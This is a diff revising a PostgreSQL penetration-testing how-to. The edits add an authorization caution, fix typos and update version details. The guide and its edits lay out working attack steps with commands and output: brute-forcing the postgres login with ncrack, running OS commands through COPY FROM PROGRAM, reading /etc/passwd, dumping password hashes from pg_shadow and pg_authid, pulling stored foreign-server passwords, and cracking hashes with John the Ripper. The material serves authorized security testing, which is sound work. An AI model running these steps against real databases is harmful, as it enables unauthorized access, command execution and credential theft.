@@ -1,5 +1,8 @@
 *** PostgreSQL DATABASE PENETRATION TESTING (HOW TO) ***
 
+> [!CAUTION]
+> **Authorized Security Testing Only:** Execute these enumeration, privilege-review, and credential-audit commands strictly on isolated lab environments or systems covered by explicit written authorization.
+
 ==============================================================================================================
 INDEX
 ==============================================================================================================
@@ -27,7 +30,7 @@ Tables are the basic unit of data storage in a database. Data is stored in rows 
 Views are virtual tables formed by a query. A view is a dictionary object that you can use until you drop it. Views are not updatable.
 
 • 'postgres' user
-The postgresSQL database's default superuser.
+The PostgreSQL database's default superuser.
   
 • DEFAULT ROLES 
 PostgreSQL provides a set of default roles which provide access to certain, commonly needed, privileged capabilities and information. Administrators can GRANT these roles to users and/or other roles in their environment, providing those users with access to the specified capabilities and information.
@@ -69,13 +72,16 @@ These methods are specified in the cluster's host-based authentication configura
 • VERSIONS 
 - https://www.postgresql.org/support/versioning/
 
-Version	Current minor	Supported	First Release		Final Release
+Supported major series (current lifecycle as of 2025–2026): PostgreSQL 13, 14, 15, 16, and 17 (default `password_encryption = scram-sha-256`).
+Historical archived table (all releases below are End-of-Life and unsupported):
+
+Version	Archived minor	Supported	First Release		Final EOL Date
 ---------------------------------------------------------------------------------
-12	12.2		Yes		October 3, 2019		November 14, 2024
-11	11.7		Yes		October 18, 2018	November 9, 2023
-10	10.12		Yes		October 5, 2017		November 10, 2022
-9.6	9.6.17		Yes		September 29, 2016	November 11, 2021
-9.5	9.5.21		Yes		January 7, 2016		February 11, 2021
+12	12.x		No (EOL)	October 3, 2019		November 14, 2024
+11	11.x		No (EOL)	October 18, 2018	November 9, 2023
+10	10.x		No (EOL)	October 5, 2017		November 10, 2022
+9.6	9.6.x		No (EOL)	September 29, 2016	November 11, 2021
+9.5	9.5.x		No (EOL)	January 7, 2016		February 11, 2021
 9.4	9.4.26		No		December 18, 2014	February 13, 2020
 9.3	9.3.25		No		September 9, 2013	November 8, 2018
 9.2	9.2.24		No		September 10, 2012	November 9, 2017
@@ -195,7 +201,7 @@ Script Output
 
 ncrack psql://sqlserver -u postgres -P /usr/share/wordlists/rockyou.txt
 
-//warning: rockyou.txt does not contain by default 'postgres'
+# Note: rockyou.txt does not contain 'postgres' by default.
 
 root@Security-Audit-01:/home/pentester# ncrack psql://192.168.1.26 -u postgres -P /usr/share/wordlists/rockyou2.txt
 Starting Ncrack 0.7 ( http://ncrack.org ) at 2020-03-20 02:22 CET
@@ -420,7 +426,7 @@ LINUX
 
 
 WINDOWS
-   • To add
+    • C:\Program Files\PostgreSQL\16\bin\psql.exe -h 192.168.1.26 -U postgres -W
 
 
 * DbVisualizer (GUI multi-database client; https://dbvis.com)
@@ -547,27 +553,27 @@ User Related
 -------------
    • \du 								List users and roles
    • \du username 							List a username if present.
-   • create role __test1__ 						Create a role with an existing username.
-   • create role __test2__ noinherit login password __passsword__; 	Create a role with username and password.
-   • set role __test__; 						Change role for current session to __test__.
-   • grant __test2__ to __test1__; 					Allow __test1__ to set its role as __test2__.
+    • create role test1;                                                -- Create a role without login
+    • create role test2 noinherit login password 'StrongPassword_2026'; -- Create a login role with password
+    • set role test2;                                                   -- Switch role for current session
+    • grant test2 to test1;                                             -- Allow test1 to assume test2
 
 
-To display the privileges of a specific suer
+To display the privileges of a specific user
 ----------------------------------------------
-   • SELECT table_catalog, table_schema, table_name, privilege_type FROM information_schema.table_privileges WHERE grantee = 'example_user';
+    • SELECT table_catalog, table_schema, table_name, privilege_type FROM information_schema.table_privileges WHERE grantee = 'example_user';
 
 Useful SQL queries
 -------------------
-   • SELECT * FROM pg_user;			Display the privileges of each user
-   • SELECT * FROM pg_roles;			Display the database roles of each user
-   • SELECT VERSION();				Display the database version
-   • \connect db_name				Change current database
-   • SELECT * FROM pg_shadow;			Extract the password hashes
-   • pg_dump -Fc dbname > filename		Back up a database (database backups are compressed by default)
-   • pg_restore -d dbname filename		Restore from backup
-   • GRANT pg_read_server_files TO test_user;	Grant privileges to a user
-   • SELECT * FROM pg_shadow;    		Dump the database password hashes
+    • SELECT * FROM pg_user;                                            -- Display user attributes
+    • SELECT * FROM pg_roles;                                           -- Display database roles
+    • SELECT VERSION();                                                 -- Display database version
+    • \connect db_name                                                  -- Change current database
+    • SELECT rolname, left(rolpassword, 13) FROM pg_authid;             -- Inspect SCRAM-SHA-256 or legacy MD5 prefix (10+/14+ use SCRAM-SHA-256)
+    • pg_dump -Fc dbname > filename                                     -- Back up a database (compressed custom format)
+    • pg_restore -d dbname filename                                     -- Restore from backup
+    • GRANT pg_read_server_files TO test_user;                          -- Audited lab role test only
+    • SELECT usename, passwd FROM pg_shadow;                            -- Inspect superuser-readable hashes (legacy md5 or SCRAM-SHA-256)
 
 
 Default Roles
@@ -591,7 +597,7 @@ Role Attributes
 A database role can have a number of attributes that define its privileges and interact with the client authentication system.
 
  • login privilege
-Only roles that have the LOGIN attribute can be used as the initial role name for a database connection. A role with the LOGIN attribute can be considered the same as a “database user”. To create a role with login privilege, use either: 'CREATE ROLE name LOGIN;' or 'CREATE USER name;'
+Only roles that have the LOGIN attribute can be used as the initial role name for a database connection. A role with the LOGIN attribute can be considered the same as a "database user". To create a role with login privilege, use either: 'CREATE ROLE name LOGIN;' or 'CREATE USER name;'
 
 • 'superuser' status: 
 A database 'superuser' bypasses all permission checks, except the right to log in. This is a dangerous privilege and should not be used carelessly; it is best to do most of your work as a role that is not a superuser. To create a new database superuser, use 'CREATE ROLE name SUPERUSER'. You must do this as a role that is already a superuser.
@@ -671,11 +677,11 @@ References state that in PostgreSQL, a superuser can execute OS commands as the 
 -------------------------------------------------------------------------
 
 • SQL queries to execute OS command using the function "COPY TO/FROM PROGRAM":
-      - DROP TABLE IF EXISTS cmd_exec;
-      - CREATE TABLE cmd_exec(cmd_output text);
-      - COPY cmd_exec FROM PROGRAM ‘id’;
-      - SELECT * FROM cmd_exec;
-      - DROP TABLE IF EXISTS cmd_exec;
+      - DROP TABLE IF EXISTS cmd_exec;
+      - CREATE TABLE cmd_exec(cmd_output text);
+      - COPY cmd_exec FROM PROGRAM 'id';
+      - SELECT * FROM cmd_exec;
+      - DROP TABLE IF EXISTS cmd_exec;
 
 Example:
 	root@Security-Audit-01:~# psql -h 192.168.1.104 -U postgres -W
@@ -747,8 +753,8 @@ docker0   Link encap:Ethernet  HWaddr 02:42:a8:79:d6:eb
 
 eth0      Link encap:Ethernet  HWaddr 08:00:27:34:bf:f6  
           inet addr:192.168.1.104  Bcast:192.168.1.255  Mask:255.255.255.0
-          inet6 addr: 2a01:e35:2fef:d7e0:f8ff:85f4:bffc:83cd/64 Scope:Global
-          inet6 addr: 2a01:e35:2fef:d7e0:a00:27ff:fe34:bff6/64 Scope:Global
+          inet6 addr: 2001:db8::10/64 Scope:Global
+          inet6 addr: 2001:db8::11/64 Scope:Global
           inet6 addr: fe80::a00:27ff:fe34:bff6/64 Scope:Link
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
           RX packets:1970 errors:0 dropped:0 overruns:0 frame:0
@@ -793,14 +799,14 @@ Then use the command "\du" to see the users and roles.
 -------------------------------------------------------------------------
 
 • SQL queries to read files from the system
-      - CREATE TABLE myfile (input TEXT);
-      - COPY myfile FROM ‘/etc/passwd’;
-      - SELECT input FROM myfile;
+      - CREATE TABLE myfile (input TEXT);
+      - COPY myfile FROM '/etc/passwd';
+      - SELECT input FROM myfile;
 
 • SQL queries to write files in /tmp
-      - CREATE TABLE testfile (output TEXT);
-      - INSERT INTO testfile(output) VALUES (‘test’);
-      - COPY testfile(output) TO ‘/tmp/testfile’;
+      - CREATE TABLE testfile (output TEXT);
+      - INSERT INTO testfile(output) VALUES ('test');
+      - COPY testfile(output) TO '/tmp/testfile';
 
 
 postgres=# SHOW  data_directory;
@@ -1174,9 +1180,12 @@ auditor=> SELECT * FROM dblink('host=127.0.0.1 user=postgres dbname=Postgres', '
 
 2. postgres_fdw module
 =======================
-=> https://www.postgresql.org/docs/12/postgres-fdw.html
+=> https://www.postgresql.org/docs/current/postgres-fdw.html
 
-To research...
+Inspect configured foreign servers and user mappings for stored credentials:
+    postgres=# SELECT srvname, srvoptions FROM pg_foreign_server;
+    postgres=# SELECT srvname, umuser::regrole, umoptions FROM pg_user_mappings; -- Note: superusers see plaintext FDW passwords in umoptions unless SSL/external auth is used.
+
 
 
 07.7. PostgreSQL authentication capture
@@ -1201,12 +1210,13 @@ It captures challenge and response pairs that can be supplied to Cain or JtR for
 
 1. Log into the Database with an account who has 'superuser' privileges
 	
-2. Dump the password hashes
-	SQL> SELECT * FROM pg_shadow; 
+2. Inspect password hashes (SCRAM-SHA-256 on PostgreSQL 10+/14+, legacy md5 on older systems)
+	SQL> SELECT rolname, rolpassword FROM pg_authid WHERE rolcanlogin;
+	SQL> SELECT usename, passwd FROM pg_shadow;
 
-3. Crack the password hashes using John the ripper
-	pentester@KaliLinux> john --wordlist=dico.txt --rules --format=postgres file-postgres-pwd.txt 
-	pentester@KaliLinux> john --format=postgres file-postgres-pwd.txt 
+3. Audit weak legacy md5 hashes with John the Ripper (isolated authorized lab only)
+	pentester@KaliLinux> john --wordlist=wordlist.txt --rules --format=postgres file-postgres-pwd.txt
+	pentester@KaliLinux> john --format=postgres file-postgres-pwd.txt
 	pentester@KaliLinux> john --show file-postgres-pwd.txt 
 	
 
